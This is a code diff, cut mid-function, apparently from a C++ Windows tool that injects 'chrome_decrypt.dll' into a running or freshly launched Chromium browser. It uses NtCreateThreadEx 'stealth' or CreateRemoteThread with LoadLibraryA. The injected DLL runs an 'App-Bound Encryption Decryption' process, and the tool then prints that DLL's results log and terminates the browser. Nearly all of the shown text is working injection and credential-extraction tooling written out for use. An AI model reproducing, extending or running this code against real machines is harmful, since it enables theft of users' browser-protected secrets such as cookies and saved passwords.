+            browserSuccessfullyStartedByInjector = true;
+            std::string versionStr = "N/A";
+            debug("Retrieving version info for: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
+            DWORD versionHandleUnused = 0;
+            DWORD versionInfoSize = GetFileVersionInfoSizeW(currentBrowserInfo.defaultExePath.c_str(), &versionHandleUnused);
+            if (versionInfoSize > 0)
             {
-                std::vector<BYTE> data(vs);
-                if (GetFileVersionInfoW(exePath.c_str(), hv, vs, data.data()))
+                std::vector<BYTE> versionData(versionInfoSize);
+                if (GetFileVersionInfoW(currentBrowserInfo.defaultExePath.c_str(), versionHandleUnused, versionInfoSize, versionData.data()))
                 {
-                    UINT len = 0;
+                    UINT ffiLen = 0;
                     VS_FIXEDFILEINFO *ffi = nullptr;
-                    if (VerQueryValueW(data.data(), L"\\", (LPVOID *)&ffi, &len))
+                    if (VerQueryValueW(versionData.data(), L"\\", (LPVOID *)&ffi, &ffiLen) && ffi)
                     {
-                        ver = std::to_string(HIWORD(ffi->dwFileVersionMS)) + "." +
-                              std::to_string(LOWORD(ffi->dwFileVersionMS)) + "." +
-                              std::to_string(HIWORD(ffi->dwFileVersionLS)) + "." +
-                              std::to_string(LOWORD(ffi->dwFileVersionLS));
+                        versionStr = std::to_string(HIWORD(ffi->dwProductVersionMS)) + "." +
+                                     std::to_string(LOWORD(ffi->dwProductVersionMS)) + "." +
+                                     std::to_string(HIWORD(ffi->dwProductVersionLS)) + "." +
+                                     std::to_string(LOWORD(ffi->dwProductVersionLS));
+                        debug("Version query successful: " + versionStr);
+                    }
+                    else
+                    {
+                        debug("VerQueryValueW failed. Error: " + std::to_string(GetLastError()));
                     }
                 }
+                else
+                {
+                    debug("GetFileVersionInfoW failed. Error: " + std::to_string(GetLastError()));
+                }
             }
-            print_status("[+]", disp + " (v. " + ver + ") launched w/ PID " + std::to_string(pid) + "");
+            else
+            {
+                debug("GetFileVersionInfoSizeW failed or returned 0. Error: " + std::to_string(GetLastError()));
+            }
+            print_status("[+]", browserDisplayName + " (v. " + versionStr + ") launched w/ PID " + std::to_string(targetPid));
         }
         else
         {
-            print_status("[-]", "Failed to start " + disp);
+            print_status("[-]", "Failed to start " + browserDisplayName);
             return 1;
         }
     }
-    if (!pid)
+    if (targetPid == 0)
     {
-        print_status("[-]", disp + " not running");
+        print_status("[-]", browserDisplayName + " not running and auto-start not requested or failed.");
         return 1;
     }
 
-    std::string mdesc = (method == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibrary";
+    std::string injectionMethodDesc = (injectionMethodStr == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibraryA";
 
-    debug("Opening process PID=" + std::to_string(pid));
-    HandleGuard ph(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid));
-    if (!ph.get())
+    debug("Opening process PID=" + std::to_string(targetPid));
+    HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
+    if (!targetProcessHandle)
     {
-        print_status("[-]", "OpenProcess failed");
+        DWORD lastError = GetLastError();
+        print_status("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(lastError));
         return 1;
     }
-    if (!CheckArchMatch(ph.get()))
+    if (!CheckArchMatch(targetProcessHandle.get()))
         return 1;
+
     std::string dllPath = GetDllPath();
-    if (dllPath.empty())
+    if (dllPath.empty() || !std::filesystem::exists(dllPath))
     {
-        print_status("[-]", "chrome_decrypt.dll not found");
+        print_status("[-]", "chrome_decrypt.dll not found or path could not be determined. Expected near: " + (dllPath.empty() ? "<Error getting path>" : dllPath));
         return 1;
     }
-    bool injected = (method == "nt") ? InjectWithNtCreateThreadEx(ph.get(), dllPath) : InjectWithLoadLibrary(ph.get(), dllPath);
-    print_status(injected ? "[+]" : "[-]", injected ? "DLL injected via " + mdesc : "DLL injection failed");
-    if (!injected)
-        return 1;
-    print_status("[*]", "Starting Chrome App-Bound Encryption Decryption process.");
-    Sleep(1000);
-    char tmpPath[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tmpPath))
+    debug("DLL path: " + dllPath);
+
+    bool injectedSuccessfully = false;
+    if (injectionMethodStr == "nt")
     {
-        std::string logf = std::string(tmpPath) + "chrome_decrypt.log";
-        debug("Opening log file " + logf);
-        std::ifstream ifs(logf);
-        std::string ln;
-        const WORD DEF = 7;
-        while (std::getline(ifs, ln))
+        injectedSuccessfully = InjectWithNtCreateThreadEx(targetProcessHandle.get(), dllPath);
+    }
+    else if (injectionMethodStr == "load")
+    {
+        injectedSuccessfully = InjectWithLoadLibrary(targetProcessHandle.get(), dllPath);
+    }
+    else
+    {
+        print_status("[-]", "Unknown injection method specified: " + injectionMethodStr);
+        return 1;
+    }
+
+    if (!injectedSuccessfully)
+    {
+        print_status("[-]", "DLL injection failed via " + injectionMethodDesc);
+        return 1;
+    }
+    print_status("[+]", "DLL injected via " + injectionMethodDesc);
+
+    print_status("[*]", "Waiting for DLL decryption tasks to complete (max " + std::to_string(DLL_COMPLETION_TIMEOUT_MS / 1000) + "s)...");
+    DWORD waitResult = WaitForSingleObject(completionEvent.get(), DLL_COMPLETION_TIMEOUT_MS);
+
+    if (waitResult == WAIT_OBJECT_0)
+    {
+        print_status("[+]", "DLL signaled completion.");
+    }
+    else if (waitResult == WAIT_TIMEOUT)
+    {
+        print_status("[-]", "Timeout waiting for DLL completion. Log may be incomplete or DLL failed.");
+    }
+    else
+    {
+        DWORD lastError = GetLastError();
+        print_status("[-]", "Error waiting for DLL completion event: " + std::to_string(lastError));
+    }
+
+    char tempPathCStr[MAX_PATH];
+    DWORD tempPathLen = GetTempPathA(MAX_PATH, tempPathCStr);
+    if (tempPathLen > 0 && tempPathLen < MAX_PATH)
+    {
+        std::filesystem::path logFilePath = std::filesystem::path(tempPathCStr) / "chrome_decrypt.log";
+        debug("Attempting to display log file: " + logFilePath.string());
+
+        std::ifstream ifs(logFilePath);
+        if (ifs.is_open())
         {
-            size_t p = 0;
-            while (p < ln.size())
+            std::string line;
+
+            CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
+            HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+            WORD originalAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
+            if (GetConsoleScreenBufferInfo(hStdOut, &consoleInfo))
             {
-                size_t o = ln.find('[', p);
-                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), DEF);
-                std::cout << ln.substr(p, (o == std::string::npos) ? std::string::npos : o - p);
-                if (o == std::string::npos)
-                    break;
-                size_t c = ln.find(']', o);
-                std::string tok = ln.substr(o, (c == std::string::npos) ? 1 : c - o + 1);
-                if (tok == "[+]")
-                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
-                else if (tok == "[-]")
-                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
-                else if (tok == "[*]")
-                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
-                std::cout << tok;
-                p = (c == std::string::npos) ? ln.size() : c + 1;
+                originalAttributes = consoleInfo.wAttributes;
             }
-            std::cout << std::endl;
+
+            while (std::getline(ifs, line))
+            {
+                size_t currentPos = 0;
+                while (currentPos < line.length())
+                {
+                    size_t tagStartPos = line.find('[', currentPos);
+
+                    SetConsoleTextAttribute(hStdOut, originalAttributes);
+                    std::cout << line.substr(currentPos, tagStartPos - currentPos);
+
+                    if (tagStartPos == std::string::npos)
+                        break;
+
+                    size_t tagEndPos = line.find(']', tagStartPos);
+                    if (tagEndPos == std::string::npos)
+                    {
+                        std::cout << line.substr(tagStartPos);
+                        break;
+                    }
+
+                    std::string tag = line.substr(tagStartPos, tagEndPos - tagStartPos + 1);
+
+                    WORD currentTagColor = originalAttributes;
+                    if (tag == "[+]")
+                        currentTagColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+                    else if (tag == "[-]")
+                        currentTagColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
+                    else if (tag == "[*]")
+                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+                    else if (tag == "[WT]")
+                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_INTENSITY;
+                    else if (tag == "[!]")
+                        currentTagColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+
+                    SetConsoleTextAttribute(hStdOut, currentTagColor);
+                    std::cout << tag;
+                    currentPos = tagEndPos + 1;
+                }
+                SetConsoleTextAttribute(hStdOut, originalAttributes);
+                std::cout << std::endl;
+            }
+            ifs.close();
         }
-        DeleteFileA(logf.c_str());
-        if (started)
+        else
         {
-            debug("Terminating browser PID=" + std::to_string(pid));
-            HandleGuard kh(OpenProcess(PROCESS_TERMINATE, FALSE, pid));
-            if (kh.get())
+            debug("Log file not found or could not be opened: " + logFilePath.string());
+            print_status("[!]", "Log file from DLL was not found or is empty.");
+        }
+
+        if (browserSuccessfullyStartedByInjector)
+        {
+            debug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
+            HandleGuard processToKillHandle(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid));
+            if (processToKillHandle)
             {
-                TerminateProcess(kh.get(), 0);
-                print_status("[*]", disp + " terminated");
+                if (TerminateProcess(processToKillHandle.get(), 0))
+                {
+                    print_status("[*]", browserDisplayName + " terminated by injector.");
+                }
+                else
+                {
+                    DWORD lastError = GetLastError();
+                    print_status("[-]", "Failed to terminate " + browserDisplayName + ". Error: " + std::to_string(lastError));
+                }
             }
+            else
+            {
+                DWORD lastError = GetLastError();
+                print_status("[-]", "Failed to open " + browserDisplayName + " for termination (it might have already exited). Error: " + std::to_string(lastError));
+            }
+        }
+        else
+        {
+            debug("Browser was already running; injector will not terminate it.");
         }
     }
-    debug("Exiting, success");
+    else
+    {
+        DWORD lastError = GetLastError();
+        print_status("[-]", "GetTempPathA failed. Error: " + std::to_string(lastError));
+    }
+    debug("Injector finished.");
     return 0;
 }
